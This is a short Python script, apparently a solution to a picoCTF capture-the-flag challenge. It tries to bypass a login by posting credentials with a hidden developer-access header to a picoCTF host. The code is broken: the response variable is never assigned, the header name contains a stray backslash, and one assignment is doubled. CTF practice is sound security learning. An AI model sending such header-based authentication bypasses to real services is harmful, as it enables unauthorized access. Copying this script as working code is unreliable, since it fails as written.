import requests

# crack the gate:
PORT=6666 # insert the right port here 
url = f'http://amiable-citadel.picoctf.net:{PORT}'
h = h={'Content-Type': 'application/json', 'X-Dev-Acc\ess':'yes'}
payload={'email':'ctf-player@picoctf.org', 'password':'PASSWORD'}
requests.post(url,json=payload,headers=h)
print(r.status_code)
print(r.text)
